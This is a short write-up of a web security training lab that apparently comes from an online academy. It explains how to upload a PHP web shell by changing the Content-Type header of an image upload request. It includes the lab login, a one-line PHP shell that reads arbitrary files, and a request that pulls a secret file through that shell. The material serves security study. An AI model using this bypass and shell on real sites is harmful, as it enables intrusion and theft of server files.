@@ -1,0 +1,21 @@
+Lab #2 - Web shell upload via Content-Type restriction bypass
+
+Vulnerabilities - This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.
+
+Goal - upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
+
+Credentials: wiener:peter
+
+Analysis:
+- log in with account wiener:peter
+- try to upload a file that is not image(using image upload function) => error: Sorry, file type application/pdf is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.
+- try to change Content-Type in the request to image/png => SUCCESSFULLY upload the file: The file avatars/PRJ1-20252-E15.pdf has been uploaded
+
+Solution:
+- log in with account wiener:peter
+- create a php file like this to execute code from remote: 
+    <?php echo file_get_contents($_GET['filename']); ?>
+- upload this file using image upload function
+- using Burp Repeater to change Content-Type to image/png and Submit
+- make a GET request to get the content of file /home/carlos/secret and submit solution.
+    GET /files/avatars/shell.php?filename=/home/carlos/secret HTTP/2
